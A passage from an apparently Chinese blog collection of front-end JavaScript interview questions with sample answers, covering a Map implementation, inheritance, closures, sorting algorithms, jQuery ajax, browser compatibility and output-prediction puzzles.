function(fn)&#123;</span></span><br><span class="line"><span class="regexp">      if(typeof fn != 'function')&#123;</span></span><br><span class="line"><span class="regexp">          return;</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">      var len = this.keys.length;</span></span><br><span class="line"><span class="regexp">      for(var i=0;i&lt;len;i++)&#123;</span></span><br><span class="line"><span class="regexp">        var k = this.keys[i];</span></span><br><span class="line"><span class="regexp">        fn(k,this.data[k],i);</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 获取键值数组(类似Java的entrySet())</span></span><br><span class="line"><span class="regexp">    this.entrys = function() &#123;</span></span><br><span class="line"><span class="regexp">      var len = this.keys.length;</span></span><br><span class="line"><span class="regexp">      var entrys = new Array(len);</span></span><br><span class="line"><span class="regexp">      for (var i = 0; i &lt; len; i++) &#123;</span></span><br><span class="line"><span class="regexp">        entrys[i] = &#123;</span></span><br><span class="line"><span class="regexp">          key : this.keys[i],</span></span><br><span class="line"><span class="regexp">          value : this.data[i]</span></span><br><span class="line"><span class="regexp">        &#125;;</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">      return entrys;</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 判断Map是否为空</span></span><br><span class="line"><span class="regexp">    this.isEmpty = function() &#123;</span></span><br><span class="line"><span class="regexp">        return this.keys.length == 0;</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 获取键值对数量</span></span><br><span class="line"><span class="regexp">    this.size = function()&#123;</span></span><br><span class="line"><span class="regexp">      return this.keys.length;</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">      </span></span><br><span class="line"><span class="regexp">    /</span><span class="regexp">/ 重写toString </span></span><br><span class="line"><span class="regexp">    this.toString = function()&#123;</span></span><br><span class="line"><span class="regexp">      var s = "&#123;";</span></span><br><span class="line"><span class="regexp">      for(var i=0;i&lt;this.keys.length;i++,s+=',')&#123;</span></span><br><span class="line"><span class="regexp">        var k = this.keys[i];</span></span><br><span class="line"><span class="regexp">        s += k+"="+this.data[k];</span></span><br><span class="line"><span class="regexp">      &#125;</span></span><br><span class="line"><span class="regexp">      s+="&#125;";</span></span><br><span class="line"><span class="regexp">      return s;</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">  function testMap()&#123;</span></span><br><span class="line"><span class="regexp">    var m = new Map();</span></span><br><span class="line"><span class="regexp">    m.put('key1','Comtop');</span></span><br><span class="line"><span class="regexp">    m.put('key2','南方电网');</span></span><br><span class="line"><span class="regexp">    m.put('key3','景新花园');</span></span><br><span class="line"><span class="regexp">    alert("init:"+m);  </span></span><br><span class="line"><span class="regexp">    m.put('key1','康拓普');</span></span><br><span class="line"><span class="regexp">    alert("set key1:"+m);</span></span><br><span class="line"><span class="regexp">    m.remove("key2");</span></span><br><span class="line"><span class="regexp">    alert("remove key2: "+m);</span></span><br><span class="line"><span class="regexp">    var s ="";</span></span><br><span class="line"><span class="regexp">    m.each(function(key,value,index)&#123;</span></span><br><span class="line"><span class="regexp">        s += index+":"+ key+"="+value+"\n";</span></span><br><span class="line"><span class="regexp">    &#125;);</span></span><br><span class="line"><span class="regexp">    alert(s);</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br><span class="line">&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">  &lt;body onload="testMap()"&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/angel_he/article/details/47613743" target="_blank" rel="noopener">用js写一个实现map</a></p><h2 id="js可否实现面向对象编程，如果可以如何实现js对象的继承"><a href="#js可否实现面向对象编程，如果可以如何实现js对象的继承" class="headerlink" title="js可否实现面向对象编程，如果可以如何实现js对象的继承"></a>js可否实现面向对象编程，如果可以如何实现js对象的继承</h2><blockquote><p>扩展原型对象实现继承<br>替换原型对象实现继承<br>另一种原型继承（动态原型模式） 特点：让代码封装到一起<br>混入继承： 已知两个对象，一个对象继承另一个对象的功能，for..in, jQuery的extend()方法原理是混入继承<br>原型+混入继承：混入继承的应用, 在一个对象的原型对象上扩展另一个对象的属性和方法, jQuery.fn.extend() 利用的原理是原型+混入继承<br>经典继承：已知一个对象knownObj，需要创建一个新对象，这个新对象继承自已知的对象knownObj,ES5 Object.create()方法的实现原理就是经典继承<br>借用构造函数实现继承<br>混合继承（经典继承+借用构造函数） 解决借用构造函数继承不能够继承原型对象上的方法的问题; 继承了两次构造函数（模板）<br>混合继承（经典继承+借用构造函数）</p></blockquote><h2 id="变量的命名规范以及命名推荐"><a href="#变量的命名规范以及命名推荐" class="headerlink" title="变量的命名规范以及命名推荐"></a>变量的命名规范以及命名推荐</h2><blockquote><p>变量，函数，方法：小写开头，以后的每个单词首字母大写 （驼峰）<br>构造函数，class：每个单词大写开头<br>基于实际情况，以动词，名词，谓词来命名。尽量言简意骇，以命名代替注释</p></blockquote><h2 id="三种弹窗的单词以及三种弹窗的功能"><a href="#三种弹窗的单词以及三种弹窗的功能" class="headerlink" title="三种弹窗的单词以及三种弹窗的功能"></a>三种弹窗的单词以及三种弹窗的功能</h2><p>1) alert</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//弹出对话框并输出一段提示信息  </span><br><span class="line">  function ale() &#123;  </span><br><span class="line">    //弹出一个对话框  </span><br><span class="line">    alert(&quot;提示信息！&quot;);  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>2) confirm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//弹出一个询问框，有确定和取消按钮  </span><br><span class="line">function firm() &#123;  </span><br><span class="line">  //利用对话框返回的值 （true 或者 false）  </span><br><span class="line">  if (confirm(&quot;你确定提交吗？&quot;)) &#123;  </span><br><span class="line">    alert(&quot;点击了确定&quot;);  </span><br><span class="line">  &#125;  </span><br><span class="line">  else &#123;  </span><br><span class="line">    alert(&quot;点击了取消&quot;);  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3) prompt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//弹出一个输入框，输入一段文字，可以提交  </span><br><span class="line">function prom() &#123;  </span><br><span class="line">  var name = prompt(&quot;请输入您的名字&quot;, &quot;&quot;); //将输入的内容赋给变量 name ，  </span><br><span class="line">  //这里需要注意的是，prompt有两个参数，前面是提示的话，后面是当对话框出来后，在对话框里的默认值  </span><br><span class="line">  if (name)//如果返回的有内容  </span><br><span class="line">  &#123;  </span><br><span class="line">    alert(&quot;欢迎您：&quot; + name)  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="输出值是"><a href="#输出值是" class="headerlink" title="输出值是"></a>输出值是</h2><blockquote><p>console.log( 8 | 1 ); // 9</p></blockquote><h2 id="求一个函数-y-f-x-a-b"><a href="#求一个函数-y-f-x-a-b" class="headerlink" title="求一个函数 y = f(x, a, b);"></a>求一个函数 y = f(x, a, b);</h2><p>只允许使用 + - / 和 Math.，当x &gt; 100 时返回 a 的值，否则返回 b 的值，不能使用 if else 等条件语句，也不能使用 |, ? :, 数组。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function f(x, a, b) &#123;</span><br><span class="line">  var temp = Math.ceil(Math.min(Math.max(x - 100, 0), 1));</span><br><span class="line">  return a * temp + b * (1 - temp);</span><br><span class="line">&#125;</span><br><span class="line">console.log(f(-10, 1, 2));</span><br></pre></td></tr></table></figure><h2 id="JavaScript-alert-0-4-0-2-结果是多少-如何处理"><a href="#JavaScript-alert-0-4-0-2-结果是多少-如何处理" class="headerlink" title="JavaScript alert(0.4*0.2); 结果是多少? 如何处理"></a>JavaScript alert(0.4*0.2); 结果是多少? 如何处理</h2><blockquote><p>有误差，应该比准确结果偏大。<br>一般我会将小数变为整数来处理。<br>当前之前遇到这个问题时也上网查询发现有人用try catch return写了一个函数，<br>当然原理也是一致先转为整数再计算。</p></blockquote><h2 id="一个div，有几种方式得到这个-div-的-jQuery-对象？"><a href="#一个div，有几种方式得到这个-div-的-jQuery-对象？" class="headerlink" title="一个div，有几种方式得到这个 div 的 jQuery 对象？"></a>一个div，有几种方式得到这个 div 的 jQuery 对象？</h2><p><code>&lt;div class=&#39;aabbcc&#39; id=&#39;nodesView&#39;&gt;&lt;/div&gt;</code></p><p>想直接获取这个div的dom对象，如何获取？dom对象如何转化为jQuery对象？</p><blockquote><p>$(“#nodesView”)<br>$(“.aabbcc”)<br>$(“#nodesView”)[0]<br>$(“.aabbcc”)[0]</p></blockquote><h2 id="jQuery-框架中-ajax-的常用参数有哪些"><a href="#jQuery-框架中-ajax-的常用参数有哪些" class="headerlink" title="jQuery 框架中 $.ajax()的常用参数有哪些"></a>jQuery 框架中 $.ajax()的常用参数有哪些</h2><p>写一个post请求并带有发送数据和返回数据的样例</p><blockquote><p>async是否异步<br>url请求地址<br>contentType发送信息至服务器时内容编码类型<br>data发送到服务器的数据<br>dataType预期服务器返回的数据类型<br>type请求类型<br>success请求成功回调函数<br>error请求失败回调函数</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">  url: &quot;/jquery/test1.txt&quot;,</span><br><span class="line">  type: &apos;post&apos;,</span><br><span class="line">  data: &#123;</span><br><span class="line">      id: 1</span><br><span class="line">  &#125;,</span><br><span class="line">  success: function(data) &#123;</span><br><span class="line">    alert(data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>下面这个ul，如何点击每一列的时候 alert 其 index</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul id=&quot;test&quot;&gt;</span><br><span class="line">  &lt;li&gt;这是第一条&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;这是第二条&lt;/li&gt;</span><br><span class="line">  &lt;li&gt;这是第三条&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">  window.onload = function() &#123;</span><br><span class="line">    var lis = document.getElementById(&apos;test&apos;).children;</span><br><span class="line">    for (var i = 0; i &lt; lis.length; i++) &#123;</span><br><span class="line">      lis[i].onclick = (function(i) &#123;</span><br><span class="line">        return function() &#123;</span><br><span class="line">          alert(i)</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;)(i);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="列出3条以上-ff-和-IE-的脚本兼容问题"><a href="#列出3条以上-ff-和-IE-的脚本兼容问题" class="headerlink" title="列出3条以上 ff 和 IE 的脚本兼容问题"></a>列出3条以上 ff 和 IE 的脚本兼容问题</h2><p>(1) window.event：</p><blockquote><p>表示当前的事件对象，IE有这个对象，FF没有，FF通过给事件处理函数传递事件对象</p></blockquote><p>(2) 获取事件源</p><blockquote><p>IE用srcElement获取事件源，而FF用target获取事件源</p></blockquote><p>(3) 添加，去除事件</p><blockquote><p>IE：element.attachEvent(“onclick”, function) element.detachEvent(“onclick”, function)<br>FF：element.addEventListener(“click”, function, true) element.removeEventListener(“click”, function, true)</p></blockquote><p>(4) 获取标签的自定义属性</p><blockquote><p>IE：div1.value或div1[“value”]<br>FF：可用div1.getAttribute(“value”);</p></blockquote><h2 id="列举浏览器对象模型BOM里常用的至少4个对象，并列举window对象的常用方法至少5个"><a href="#列举浏览器对象模型BOM里常用的至少4个对象，并列举window对象的常用方法至少5个" class="headerlink" title="列举浏览器对象模型BOM里常用的至少4个对象，并列举window对象的常用方法至少5个"></a>列举浏览器对象模型BOM里常用的至少4个对象，并列举window对象的常用方法至少5个</h2><blockquote><p>对象：Window document location screen history navigator<br>方法：Alert() confirm() prompt() open() close()</p></blockquote><h2 id="在Javascript中什么是伪数组？如何将伪数组转化为标准数组？"><a href="#在Javascript中什么是伪数组？如何将伪数组转化为标准数组？" class="headerlink" title="在Javascript中什么是伪数组？如何将伪数组转化为标准数组？"></a>在Javascript中什么是伪数组？如何将伪数组转化为标准数组？</h2><blockquote><p>伪数组（类数组）：无法直接调用数组方法或期望length属性有什么特殊的行为，但仍可以对真正数组遍历方法来遍历它们。<br>典型的是函数的argument参数，还有像调用getElementsByTagName,document.childNodes之类的,它们都返回NodeList对象都属于伪数组。<br>可以使用Array.prototype.slice.call(fakeArray)将数组转化为真正的Array对象。</p></blockquote><h2 id="写一个函数可以计算-sum-5-0-5-输出0-sum-1-2-3-4-输出10"><a href="#写一个函数可以计算-sum-5-0-5-输出0-sum-1-2-3-4-输出10" class="headerlink" title="写一个函数可以计算 sum(5, 0, -5); 输出0; sum(1,2,3,4); 输出10;"></a>写一个函数可以计算 sum(5, 0, -5); 输出0; sum(1,2,3,4); 输出10;</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> arr = <span class="built_in">arguments</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> num = <span class="built_in">arguments</span>[i];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> num==<span class="string">'number'</span>) &#123;</span><br><span class="line">      result += num;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><p>写出代码对下列数组去重并从大到小排列 {5,2,3,6,8,6,5,4,7,1,9}</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arr.length<span class="number">-1</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; arr.length<span class="number">-1</span>-i; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(arr[j] &lt; arr[j+<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">var</span> temp = arr[j];</span><br><span class="line">        arr[j] = arr[j+<span class="number">1</span>];</span><br><span class="line">        arr[j+<span class="number">1</span>] = temp;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> c = arr[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> s = i + <span class="number">1</span>; s &lt; arr.length; s++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(arr[s] == c)&#123;</span><br><span class="line">        <span class="comment">//debugger;</span></span><br><span class="line">        arr.splice(s,<span class="number">1</span>);</span><br><span class="line">        s--;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(fn([<span class="number">5</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">9</span>]).toString());</span><br></pre></td></tr></table></figure><h2 id="请写出一个程序"><a href="#请写出一个程序" class="headerlink" title="请写出一个程序"></a>请写出一个程序</h2><p>在页面加载完成后动态创建一个form表单，并在里面添加一个input对象并给它任意赋值后义post方式提交到：<code>http://127.0.0.1/save.php</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> form=<span class="built_in">document</span>.createElement(<span class="string">"form"</span>);</span><br><span class="line">  form.setAttribute(<span class="string">"method"</span>, <span class="string">"post"</span>);</span><br><span class="line">  form.setAttribute(<span class="string">"action"</span>, <span class="string">"http://127.0.0.1/save.php"</span>);</span><br><span class="line">  <span class="keyword">var</span> input=<span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</span><br><span class="line">  form.appendChild(input);</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(form);</span><br><span class="line">  input.value=<span class="string">"cxc"</span>;</span><br><span class="line">  form.submit();<span class="comment">//提交表单</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用JavaScript实现冒泡排序。数据为23、45、18、37、92、13、24"><a href="#用JavaScript实现冒泡排序。数据为23、45、18、37、92、13、24" class="headerlink" title="用JavaScript实现冒泡排序。数据为23、45、18、37、92、13、24"></a>用JavaScript实现冒泡排序。数据为23、45、18、37、92、13、24</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//升序算法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sort</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt;arr.length; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt;arr.length-i; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(arr[j]&gt;arr[j+<span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">var</span> c=arr[j];<span class="comment">//交换两个变量的位置</span></span><br><span class="line">        arr[j]=arr[j+<span class="number">1</span>];</span><br><span class="line">        arr[j+<span class="number">1</span>]=c;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> arr.toString();</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(sort([<span class="number">23</span>,<span class="number">45</span>,<span class="number">18</span>,<span class="number">37</span>,<span class="number">92</span>,<span class="number">13</span>,<span class="number">24</span>]));</span><br></pre></td></tr></table></figure><h2 id="前端代码优化的方法"><a href="#前端代码优化的方法" class="headerlink" title="前端代码优化的方法"></a>前端代码优化的方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> User = &#123; </span><br><span class="line">  count = <span class="number">1</span>，</span><br><span class="line">  getCount：<span class="function"><span class="keyword">function</span>（）</span>&#123; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.count;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(User.getCount());</span><br><span class="line"><span class="keyword">var</span> func = User.getCount;</span><br><span class="line"><span class="built_in">console</span>.log(func());</span><br></pre></td></tr></table></figure><p>输出结果：1 undefined（因为是window对象执行了func函数）;</p><h2 id="下列JavaScript代码执行后，依次alert的结果是"><a href="#下列JavaScript代码执行后，依次alert的结果是" class="headerlink" title="下列JavaScript代码执行后，依次alert的结果是"></a>下列JavaScript代码执行后，依次alert的结果是</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a=b=<span class="number">5</span>;</span><br><span class="line">  alert(<span class="keyword">typeof</span> a);</span><br><span class="line">  alert(<span class="keyword">typeof</span> b);</span><br><span class="line">&#125;)();</span><br><span class="line">alert(<span class="keyword">typeof</span> a);</span><br><span class="line">alert(<span class="keyword">typeof</span> b);</span><br></pre></td></tr></table></figure><p>输出结果：<br>number<br>number<br>undefined<br>number</p><h2 id="下列JavaScript代码执行后，iNum的值是"><a href="#下列JavaScript代码执行后，iNum的值是" class="headerlink" title="下列JavaScript代码执行后，iNum的值是"></a>下列JavaScript代码执行后，iNum的值是</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> iNum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>; i&lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(i % <span class="number">5</span> == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  iNum++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：答案：8</p><h2 id="输出结果是多少"><a href="#输出结果是多少" class="headerlink" title="输出结果是多少"></a>输出结果是多少</h2><p>1）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"><span class="keyword">var</span> b = a * <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (b == b) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(b * <span class="number">2</span> + <span class="string">"2"</span> - <span class="number">0</span> + <span class="number">4</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(!b * <span class="number">2</span> + <span class="string">"2"</span> - <span class="number">0</span> + <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：26</p><p>2）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">  var a;</span></span><br><span class="line"><span class="regexp">  var b = a * 0;</span></span><br><span class="line"><span class="regexp">  if (b == b) &#123;</span></span><br><span class="line"><span class="regexp">    console.log(b * 2 + "2" - 0 + 4);</span></span><br><span class="line"><span class="regexp">  &#125; else &#123;</span></span><br><span class="line"><span class="regexp">    console.log(!b * 2 + "2" - 0 + 4);</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><p>输出结果：6</p><p>3）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">t</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> t = t++;</span><br><span class="line">&#125;test(t);</span><br><span class="line"><span class="built_in">console</span>.log(t);</span><br></pre></td></tr></table></figure><p>输出结果：10</p><p>4）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">test</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> t = test++;</span><br><span class="line">&#125;test(t);</span><br><span class="line"><span class="built_in">console</span>.log(t);</span><br></pre></td></tr></table></figure><p>输出结果：10</p><p>5）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">test</span>)</span>&#123;</span><br><span class="line">  t = test++;</span><br><span class="line">&#125;test(t);</span><br><span class="line"><span class="built_in">console</span>.log(t);</span><br></pre></td></tr></table></figure><p>输出结果：10</p><p>6）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">test</span>)</span>&#123;</span><br><span class="line">  t = t + test;</span><br><span class="line">  <span class="built_in">console</span>.log(t);</span><br><span class="line">  <span class="keyword">var</span> t = <span class="number">3</span>;</span><br><span class="line">&#125;test(t);</span><br><span class="line"><span class="built_in">console</span>.log(t);</span><br></pre></td></tr></table></figure><p>输出结果：NaN 10</p><p>7）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"><span class="keyword">var</span> b = a / <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (b == b) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(b * <span class="number">2</span> + <span 